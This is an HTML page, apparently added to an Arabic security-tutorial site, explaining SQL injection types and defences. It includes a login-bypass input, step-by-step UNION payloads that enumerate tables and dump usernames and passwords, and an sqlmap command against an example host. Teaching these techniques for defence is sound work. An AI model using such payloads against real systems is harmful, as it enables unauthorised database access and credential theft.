@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" href="/style/style.css">
+    <link rel="icon" href="img/black-hole.ico" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    <title>MADAR - ثغرات SQL Injection: الشرح الكامل والاستغلال والحماية</title>
+</head>
+<body>
+<header class="main-header">
+    <a href="https://sb3ly.github.io/madar/index.html" class="site-logo">M<span class="red">a</span>dar</a>
+    <nav class="main-nav" id="main-nav">
+        <ul>
+            <li><a href="index.html" >Home</a></li>
+            <li><a href="Tutorials.html" class="active">Tutorials</a></li>
+            <li><a href="tools.html ">Tools</a></li>
+            <li><a href="about.html ">who am i</a></li>
+            <li><a href="notes.html ">notes</a></li>
+        </ul>
+    </nav>
+    <div id="burger-icon">
+        <i class="fa-solid fa-bars"></i>
+    </div>
+</header>
+
+    <main>
+        <section class="container">
+            <h1 class="page-title">🛡️ ثغرات SQL Injection: الشرح الكامل والاستغلال والحماية</h1>
+
+            <div class="article-content">
+                <p><strong>ثغرة SQL Injection (حقن قواعد البيانات)</strong> هي واحدة من أخطر الثغرات الأمنية التي تصيب التطبيقات التي تعتمد على قواعد البيانات. تحدث عندما يتم إدخال أو "حقن" أوامر SQL ضارة داخل مدخلات المستخدم غير المؤمنة، مما يسمح للمهاجم بتنفيذ أوامر مباشرة على قاعدة البيانات.</p>
+                <p><strong>مثال سريع:</strong></p>
+                <div class="code-block">
+                    <pre><code>SELECT * FROM users WHERE username = '$input';</code></pre>
+                </div>
+                <p>إذا كان الإدخال <code>admin' --</code> فسيصبح:</p>
+                <div class="code-block">
+                    <pre><code>SELECT * FROM users WHERE username = 'admin' --';</code></pre>
+                </div>
+                <p>وسيتم تخطي التحقق من كلمة المرور!</p>
+
+                ---
+                <h2>🔍 أنواع SQL Injection</h2>
+                <h3>1. Classic SQLi (In-band)</h3>
+                <ul>
+                    <li><strong>Error-based:</strong> يعتمد على رسائل الخطأ من الخادم.</li>
+                    <li><strong>Union-based:</strong> يستخدم أمر <code>UNION</code> لدمج نتائج استعلامات إضافية.</li>
+                </ul>
+
+                <h3>2. Blind SQLi</h3>
+                <p>لا يتم عرض نتائج الاستعلام، ولكن يمكن استنتاجها عبر الاستجابات (نعم/لا).</p>
+                <ul>
+                    <li><strong>Boolean-based:</strong> يعتمد على العبارات المنطقية.</li>
+                    <li><strong>Time-based:</strong> يستخدم تأخير زمني <code>SLEEP()</code> لتحديد ما إذا كان الشرط صحيحًا.</li>
+                </ul>
+
+                <h3>3. Out-of-Band SQLi</h3>
+                <p>تستخدم قنوات خارجية (مثل DNS أو HTTP) لإرسال النتائج إلى المهاجم. نادرة وتحدث عندما لا يمكن استخدام In-band أو Blind.</p>
+
+                ---
+                <h2>🎯 كيفية استغلال SQL Injection</h2>
+                <h3>🧪 مثال تطبيقي (Union-based):</h3>
+                <p>نفترض هذا الرابط:</p>
+                <div class="code-block">
+                    <pre><code>https://madar.com/product.php?id=5</code></pre>
+                </div>
+                <p>نجرب:</p>
+                <div class="code-block">
+                    <pre><code>?id=5' UNION SELECT null,null--</code></pre>
+                </div>
+                <p>ثم نزيد الأعمدة حتى لا تظهر أخطاء:</p>
+                <div class="code-block">
+                    <pre><code>?id=5' UNION SELECT 1,2,3--</code></pre>
+                </div>
+                <p>إذا ظهرت القيم في الصفحة، نعرف عدد الأعمدة والمواقع المعروضة.</p>
+                <p>ثم نحاول كشف أسماء الجداول:</p>
+                <div class="code-block">
+                    <pre><code>?id=5' UNION SELECT table_name, null, null FROM information_schema.tables--</code></pre>
+                </div>
+                <p>ثم أعمدة الجدول:</p>
+                <div class="code-block">
+                    <pre><code>?id=5' UNION SELECT column_name, null, null FROM information_schema.columns WHERE table_name='users'--</code></pre>
+                </div>
+                <p>ثم نطلب البيانات:</p>
+                <div class="code-block">
+                    <pre><code>?id=5' UNION SELECT username, password, null FROM users--</code></pre>
+                </div>
+
+                ---
+                <h2>🛠️ أدوات استغلال SQLi</h2>
+                <ul>
+                    <li>✅ <strong>sqlmap:</strong> أشهر أداة تلقائية.</li>
+                    <div class="code-block">
+                        <pre><code>sqlmap -u "http://madar.com/product.php?id=1" --dbs</code></pre>
+                    </div>
+                    <li>✅ <strong>Burp Suite</strong></li>
+                    <li>✅ <strong>Havij</strong> (غير مفتوح المصدر، خطير أمنيًا)</li>
+                </ul>
+
+                ---
+                <h2>🛡️ كيف نحمي تطبيقاتنا من SQL Injection؟</h2>
+                <h3>1. ✅ استخدام الاستعلامات المجهزة (Prepared Statements)</h3>
+                <p>مثال بلغة PHP (PDO):</p>
+                <div class="code-block">
+                    <pre><code>$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
+$stmt->execute(['username' => $input]);</code></pre>
+                </div>
+
+                <h3>2. ✅ التحقق من مدخلات المستخدم</h3>
+                <ul>
+                    <li>السماح فقط بالقيم المتوقعة (رقم؟ بريد؟ كلمة؟).</li>
+                    <li>استخدام "whitelist" بدلًا من "blacklist".</li>
+                </ul>
+
+                <h3>3. ✅ الحد من صلاحيات قاعدة البيانات</h3>
+                <p>لا تجعل التطبيق يتصل بقاعدة البيانات بصلاحية root أو admin.</p>
+
+                <h3>4. ✅ إخفاء الأخطاء</h3>
+                <p>لا تعرض رسائل الخطأ في الواجهة النهائية للمستخدم.</p>
+
+                <h3>5. ✅ استخدام Web Application Firewall (WAF)</h3>
+                <p>مثل ModSecurity أو AWS WAF لحماية التطبيقات من الحقن الشائع.</p>
+
+                <h3>6. ✅ اختبار الأمان بشكل دوري</h3>
+                <ul>
+                    <li>استخدم أدوات مثل sqlmap و Burp Suite.</li>
+                    <li>إجراء فحوصات أمان دورية (Penetration Testing).</li>
+                </ul>
+
+                ---
+                <h2>⚠️ ملاحظات هامة</h2>
+                <ul>
+                    <li>ثغرات SQLi قد تؤدي إلى تسريب بيانات حساسة أو حتى السيطرة الكاملة على الخادم.</li>
+                    <li>أغلب حوادث الاختراق الكبرى كانت بسبب SQL Injection.</li>
+                    <li>معالجة الثغرات في جانب الخادم ضروري؛ لا تعتمد فقط على JavaScript أو التحقق من جانب المستخدم.</li>
+                </ul>
+
+                ---
+                <h2>📚 مصادر إضافية</h2>
+                <ul>
+                    <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP SQL Injection</a></li>
+                    <li><a href="https://sqlmap.org" target="_blank">sqlmap official documentation</a></li>
+                </ul>
+            </div>
+        </section>
+    </main>
+
+    <footer class="main-footer">
+        <div class="social-links">
+            <a href="#" aria-label="Twitter"><i class="fab fa-twitter"></i></a>
+            <a href="#" aria-label="GitHub"><i class="fab fa-github"></i></a>
+            <a href="#" aria-label="LinkedIn"><i class="fab fa-linkedin-in"></i></a>
+        </div>
+        </footer>
+
+    <script src="/js/script.js"></script>
+</body>
+</html>
